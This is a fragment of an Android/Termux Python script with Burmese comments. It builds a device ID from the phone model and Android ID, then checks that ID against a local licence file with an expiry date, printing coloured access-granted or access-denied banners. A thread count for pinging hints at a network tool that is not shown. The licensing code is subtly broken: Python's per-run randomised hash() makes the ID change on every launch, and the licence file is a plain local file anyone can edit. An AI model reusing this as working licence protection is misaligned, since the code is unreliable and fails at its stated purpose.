# ===============================
# PREMIUM COLORS & CONFIG
# ===============================
R = "\033[91m" 
G = "\033[92m" 
C = "\033[96m" 
Y = "\033[93m" 
M = "\033[95m" 
W = "\033[97m" 
X = "\033[0m"

LICENSE_PATH = os.path.expanduser("~/.approved_devices.db")
STOP_EVENT = threading.Event()
PING_THREADS = 15  # Speed ကို မြှင့်တင်ထားသည်

# ===============================
# UNIQUE ID SYSTEM (တစ်ယောက်နဲ့တစ်ယောက် မတူအောင်)
# ===============================
def get_hwid():
    try:
        # ဖုန်း Model ယူခြင်း
        model = subprocess.check_output('getprop ro.product.model', shell=True).decode().strip().replace(" ", "")
        # Android ID ယူခြင်း
        android_id = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
        # Hash လုပ်ပြီး ပိုထူးခြားအောင် လုပ်ခြင်း
        unique_hash = str(abs(hash(model + android_id)))[:4]
        
        # Format: PREMIUM-MODEL-ANDROIDID-HASH
        return f"PREMIUM-{model[:4].upper()}-{android_id[:6].upper()}-{unique_hash}"
    except:
        return f"PREMIUM-UNKNOWN-{random.randint(1000, 9999)}"

def check_approval():
    os.system('clear')
    my_id = get_hwid()
    current_date = datetime.now().date()
    
    if not os.path.exists(LICENSE_PATH):
        with open(LICENSE_PATH, "w") as f: f.write("")

    found = False
    is_expired = False
    expiry_date_str = ""

    with open(LICENSE_PATH, "r") as f:
        lines = f.readlines()
        for line in lines:
            if "|" in line:
                stored_id, date_str = line.strip().split("|")
                if stored_id == my_id:
                    found = True
                    expiry_date_str = date_str
                    try:
                        expiry_date = datetime.strptime(date_str, "%Y-%m-%d").date()
                        if current_date > expiry_date:
                            is_expired = True
                    except:
                        is_expired = True 
                    break

    print(f"{M}╔══════════════════════════════════════════════════════╗")
    print(f"║          {W}PREMIUM SECURITY (OFFLINE MODE){M}             ║")
    print(f"╚══════════════════════════════════════════════════════╝{X}")
    print(f"{C}[*] SYSTEM ID : {Y}{my_id}{X}")
    print(f"{M}──────────────────────────────────────────────────────{X}")

    if not found:
        print(f"{R}[×] ACCESS DENIED!{X}")
        print(f"{W}[!] Your device is not registered.{X}")
        print(f"{W}[!] Send ID to Admin to Activate.{X}")
        print(f"{M}──────────────────────────────────────────────────────{X}")
        sys.exit()
    
    if is_expired:
        print(f"{R}[×] LICENSE EXPIRED!{X}")
        print(f"{W}[!] Your access ended on: {R}{expiry_date_str}{X}")
        print(f"{W}[!] Please contact Admin for renewal.{X}")
        print(f"{M}──────────────────────────────────────────────────────{X}")
        sys.exit()

    print(f"{G}[✓] ACCESS GRANTED!{X}")
    print(f"{C}[i] License Valid Until: {G}{expiry_date_str}{X}")
    time.sleep(2)
    return True

